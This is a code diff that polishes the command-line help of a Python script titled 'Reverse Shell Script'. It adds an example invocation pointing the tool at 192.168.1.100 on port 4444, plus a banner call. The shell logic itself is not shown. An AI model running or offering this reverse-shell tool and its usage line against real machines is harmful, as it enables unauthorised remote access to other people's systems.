@@ -54,9 +54,19 @@ def main(target_ip, target_port):
     s.close()
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Reverse Shell Script")
+    parser = argparse.ArgumentParser(
+        description="Reverse Shell Script",
+        epilog="""
+Example usage:
+  python reverse_shell.py 192.168.1.100 4444
+
+This will connect to the target machine at 192.168.1.100 on port 4444.
+""",
+        formatter_class=argparse.RawTextHelpFormatter
+    )
     parser.add_argument("target_ip", help="Target IP address")
     parser.add_argument("target_port", type=int, help="Target Port")
     args = parser.parse_args()
     
+    show_banner()
     main(args.target_ip, args.target_port)
